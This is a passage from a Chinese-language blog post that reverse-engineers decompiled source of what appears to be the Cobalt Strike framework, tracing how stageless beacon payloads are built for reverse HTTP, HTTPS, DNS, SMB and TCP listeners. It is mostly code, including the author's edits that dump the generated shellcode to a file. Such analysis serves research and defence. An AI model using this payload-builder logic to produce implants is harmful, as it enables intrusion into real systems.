punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"exitf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token string">"Process"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var7 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ScListener</span> var8 <span class="token operator">=</span> <span class="token class-name">ListenerUtils</span><span class="token punctuation">.</span><span class="token function">getListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var8 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>dialog<span class="token punctuation">.</span><span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"A listener was not selected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var9 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"payload_guards"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var10 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var11 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"http_library"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager <span class="token operator">=</span> var8<span class="token punctuation">.</span><span class="token function">export</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var9<span class="token punctuation">,</span> var10<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//stageless 生成函数 shellcode 生成点</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span><span class="token string">"测试是否是shellcode生成点.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//是shelllcode直接上线成功</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>dialog<span class="token punctuation">.</span><span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"Could not generate "</span> <span class="token operator">+</span> var4 <span class="token operator">+</span> <span class="token string">" payload for "</span> <span class="token operator">+</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var12 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token class-name">String</span> var13 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"PowerShell"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">getDefaultFileName</span><span class="token punctuation">(</span><span class="token string">"beacon"</span><span class="token punctuation">,</span> <span class="token string">"ps1"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Raw"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">getDefaultFileName</span><span class="token punctuation">(</span><span class="token string">"beacon"</span><span class="token punctuation">,</span> <span class="token string">"bin"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"EXE"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">getDefaultFileName</span><span class="token punctuation">(</span><span class="token string">"beacon"</span><span class="token punctuation">,</span> <span class="token string">"exe"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"DLL"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">getDefaultFileName</span><span class="token punctuation">(</span><span class="token string">"beacon"</span><span class="token punctuation">,</span> <span class="token string">"dll"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">SafeDialogs</span><span class="token punctuation">.</span><span class="token function">saveFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">JFrame</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> var13<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>由上篇的stage我们知道 this.stager &#x3D; var8.export(this.client, var4, var6, var9, var10, var11); &#x2F;&#x2F;stageless 生成函数 shellcode 生成点 为shellcode生成点我们先进入函数内部看看干了啥了</p><p>src&#x2F;common&#x2F;ScListener.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">export</span><span class="token punctuation">(</span><span class="token class-name">AggressorClient</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">int</span> var3<span class="token punctuation">,</span> <span class="token class-name">String</span> var4<span class="token punctuation">,</span> <span class="token class-name">String</span> var5<span class="token punctuation">,</span> <span class="token class-name">String</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"shellcode 生成点.............. "</span><span class="token operator">+</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BeaconDLL</span> var7 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>我们在进去this.A函数看看。下面代码根据监听器生成payload</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">BeaconDLL</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token keyword">int</span> var2<span class="token punctuation">,</span> <span class="token class-name">AggressorClient</span> var3<span class="token punctuation">,</span> <span class="token class-name">String</span> var4<span class="token punctuation">,</span> <span class="token class-name">String</span> var5<span class="token punctuation">,</span> <span class="token class-name">String</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless dll payload .........."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/foreign/reverse_http"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_getPayloadStager</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/foreign/reverse_https"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_getPayloadStager</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">BeaconPayload</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconPayload</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成 payload</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_http/reverse_http"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"listener windows/beacon_http/reverse_http"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportBeaconStageHTTP</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCallbackHosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_https/reverse_https"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportBeaconStageHTTP</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCallbackHosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_dns/reverse_dns_txt"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportBeaconStageDNS</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCallbackHosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_bind_pipe"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isExternalC2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportExternalC2Stage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_bind_pipe"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportSMBStage</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_bind_tcp"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportBindTCPStage</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_reverse_tcp"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportReverseTCPStage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestFail</span><span class="token punctuation">(</span><span class="token string">"Unknown payload '"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BeaconDLL</span> var8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconDLL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>fileName <span class="token operator">=</span> <span class="token string">"unknown.beacon.dll"</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>originalDLL <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>peProcessedDLL <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> var8<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>我们这里的监听器是 listener windows&#x2F;beacon_https&#x2F;reverse_https 所以进入到这个函数  var7.exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, true, var4);<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241035767.png" alt="代码分析执行"><br>src&#x2F;beacon&#x2F;BeaconPayload.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">BeaconDLL</span> <span class="token function">exportBeaconStageHTTP</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var4<span class="token punctuation">,</span> <span class="token class-name">String</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless exportBeaconStageHTTP "</span><span class="token operator">+</span>var2<span class="token operator">+</span><span class="token string">" | "</span><span class="token operator">+</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestSetValue</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">,</span> <span class="token string">"x86, x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var6 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x86"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> <span class="token string">"resources/winhttpb.dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x64"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> <span class="token string">"resources/winhttpb.x64.dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x86"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> <span class="token string">"resources/beacon.dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x64"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> <span class="token string">"resources/beacon.x64.dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var7 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>C</span><span class="token punctuation">(</span><span class="token string">"HTTP"</span><span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//var5在 http请求中为空</span>var7 <span class="token operator">=</span> var7 <span class="token operator">+</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless exportBeaconStageHTTP :| "</span> <span class="token operator">+</span>var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless exportBeaconStageHTTP loadDll: "</span> <span class="token operator">+</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BeaconDLL</span> var8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconDLL</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>originalDLL <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">exportBeaconStage</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>peProcessedDLL <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pe<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>var8<span class="token punctuation">.</span>originalDLL<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span><span class="token function">setCustomLoaderSize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getCustomLoaderSizeKB</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var8<span class="token punctuation">.</span><span class="token function">usesCustomLoaderSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x86"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span>customFileName <span class="token operator">=</span> <span class="token string">"resources/winhttpb"</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getCustomLoaderExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x64"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span>customFileName <span class="token operator">=</span> <span class="token string">"resources/winhttpb.x64"</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getCustomLoaderExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x86"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span>customFileName <span class="token operator">=</span> <span class="token string">"resources/beacon"</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getCustomLoaderExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x64"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span>customFileName <span class="token operator">=</span> <span class="token string">"resources/beacon.x64"</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getCustomLoaderExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>var8<span class="token punctuation">.</span>customDLL <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">exportBeaconStage</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var8<span class="token punctuation">.</span>customFileName<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> var8<span class="token punctuation">;</span><span class="token 